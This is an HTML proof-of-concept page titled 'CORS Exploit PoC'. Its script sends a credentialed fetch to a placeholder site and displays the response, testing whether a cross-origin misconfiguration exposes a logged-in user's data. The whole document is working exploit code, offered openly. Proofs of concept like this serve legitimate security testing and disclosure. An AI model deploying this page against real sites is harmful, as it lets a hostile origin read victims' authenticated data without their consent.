<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Exploit PoC</h1>
    <button id="exploitButton">Fetch Sensitive Data</button>
    <pre id="response"></pre>

    <script>
        document.getElementById("exploitButton").addEventListener("click", () => {
            fetch("https://example.com", {
                method: "GET",
                credentials: "include" // Includes cookies for authenticated requests
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById("response").textContent = data;
            })
            .catch(err => {
                document.getElementById("response").textContent = `Error: ${err}`;
            });
        });
    </script>
</body>
</html>
